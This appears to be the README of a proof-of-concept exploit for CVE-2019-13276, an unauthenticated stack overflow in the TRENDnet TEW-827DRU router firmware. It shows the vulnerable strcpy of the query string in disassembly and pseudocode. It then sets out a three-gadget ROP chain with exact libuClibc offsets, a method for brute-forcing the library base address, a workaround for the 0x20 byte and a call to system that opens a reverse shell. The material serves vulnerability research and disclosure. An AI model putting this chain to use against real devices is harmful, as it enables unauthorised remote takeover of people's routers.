## CVE-2019-13276 

This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The executed cgi file will `strcpy` the query string provided in the URL whose destination is a valid .cgi,
.txt, .asp, or .js file. The vulnerable code within main is shown below.

```
LOAD:004107E4                 addiu   $v0, $fp, 0x1F0+var_108
LOAD:004107E8                 sw      $v0, 0x1F0+dest($fp)
LOAD:004107EC                 la      $v0, loc_4B0000
LOAD:004107F0                 nop
LOAD:004107F4                 addiu   $a0, $v0, (aQueryString - 0x4B0000)  # "QUERY_STRING"
LOAD:004107F8                 la      $v0, getenv
LOAD:004107FC                 nop
LOAD:00410800                 move    $t9, $v0
LOAD:00410804                 jalr    $t9 ; getenv
LOAD:00410808                 nop
LOAD:0041080C                 lw      $gp, 0x1F0+saved_gp($fp)
LOAD:00410810                 sw      $v0, 0x1F0+var_1AC($fp)
LOAD:00410814                 lw      $v0, 0x1F0+var_1AC($fp)
LOAD:00410818                 nop
LOAD:0041081C                 beqz    $v0, loc_4109B0
LOAD:00410820                 nop
LOAD:00410824                 lw      $v0, 0x1F0+var_1AC($fp)
LOAD:00410828                 lw      $a0, 0x1F0+dest($fp)  # dest
LOAD:0041082C                 move    $a1, $v0         # src
LOAD:00410830                 la      $v0, strcpy
LOAD:00410834                 nop
LOAD:00410838                 move    $t9, $v0
LOAD:0041083C                 jalr    $t9 ; strcpy
```

Pseudo code:
```C
query_string = getenv("QUERY_STRING");
if (NULL != query_string) {
    strcpy(dest, query_string);
    ...
}
```

## ROP Gadgets
All gadgets come from `libuClibc-0.9.33.2.so`. The cgi file that contains the exploit was compiled with library 
randomization enabled meaning it is loaded at a random address each time it is run. Because of this the exploit must be 
repeatedly thrown until `libuClibc` gets loaded at the address used as the base in the exploit. Sometimes this is quick,
sometimes it takes a few minutes. A valid load address was found through UART debugging and repeatedly throwing the 
exploit until one of the processes blocked. Once the process was blocked I examined the process mapping and used the 
loaded address of `libuClibc` for the base in all the exploits. 

The ROP chain used in the exploit is shown below.

#### ROP1
This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
and $v1 to move arguments around. Because of this the functions that contain the exploit only save `$fp` and `$ra` which is 
kinda hard to make useful chains with one registers. The first rop gadget gives us control of `$s0` - `$s6` to give us a 
larger variety of gadgets.

#### ROP2
The address of system ends in 0x20, ASCII for space, which we can't send in the URL without encoding. So, we replace the 0x20 
with 0x1C and use this gadget to increment the address of system to the proper address.

#### ROP3
Grab a string off the stack and call system with it.

```

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  | $ra will be address of ROP2
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                | Address of system is in $s3
|             |               | move    $t9, $s5              | Address of ROP3 in $s5
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 | Command is on the stack at this offset.
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              | Move system to $t9
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

```

The overflow is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow

## Example Output

![Example output](./img/query_overflow.png)
